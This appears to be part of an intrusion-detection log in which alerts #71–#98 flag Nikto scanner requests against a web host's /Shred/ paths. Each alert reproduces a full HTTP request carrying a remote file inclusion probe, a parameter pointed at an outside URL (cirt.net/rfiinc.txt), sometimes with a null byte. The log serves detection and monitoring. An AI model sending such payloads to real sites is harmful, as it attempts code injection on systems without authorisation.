+ALERT #71: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/Filter.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003998)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #72: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/Filter.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003998)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #73: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test1.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005973)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #74: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test1.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005973)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #75: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/Filters/SingleFilter.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003999)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #76: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/Filters/SingleFilter.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003999)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #77: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test2.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005974)
+Connection: Keep-Alive
+
+)!
+ALERT #78: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test2.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005974)
+Connection: Keep-Alive
+
+)!
+ALERT #79: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/Form.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004000)
+
+)!
+ALERT #80: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/Form.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004000)
+
+)!
+ALERT #81: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test3.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005975)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #82: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test3.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005975)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+
+)!
+ALERT #83: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test4.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005976)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #84: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test4.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005976)
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+
+)!
+ALERT #85: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/FormManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004001)
+
+)!
+ALERT #86: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/FormManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004001)
+
+)!
+ALERT #87: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/LoginManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004002)
+
+)!
+ALERT #88: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/OpenSiteAdmin/scripts/classes/LoginManager.php?path=http://cirt.net/rfiinc.txt?%00 HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004002)
+
+)!
+ALERT #89: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test5.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005977)
+Connection: Keep-Alive
+
+)!
+ALERT #90: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test5.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005977)
+Connection: Keep-Alive
+
+)!
+ALERT #91: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/PHP/includes/header.inc.php?root=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004003)
+Connection: Keep-Alive
+
+)!
+ALERT #92: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/shoppingCart/PHP/includes/header.inc.php?root=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004003)
+Connection: Keep-Alive
+
+)!
+ALERT #93: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test6.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005978)
+Connection: Keep-Alive
+
+)!
+ALERT #94: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/theme/test6.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005978)
+Connection: Keep-Alive
+
+)!
+ALERT #95: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/themes.php?GLOBALS[theme_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005979)
+Connection: Keep-Alive
+
+)!
+ALERT #96: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/themes.php?GLOBALS[theme_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005979)
+Connection: Keep-Alive
+
+)!
+ALERT #97: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/themes/blackorange.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005980)
+
+)!
+ALERT #98: Nikto scan is detected from 10.151.31.252 (HTTP) (GET /Shred/doLogin.action/themes/blackorange.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1
+Connection: Keep-Alive
+Host: ec2-54-245-134-126.us-west-2.compute.amazonaws.com
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:005980)
+
+)!
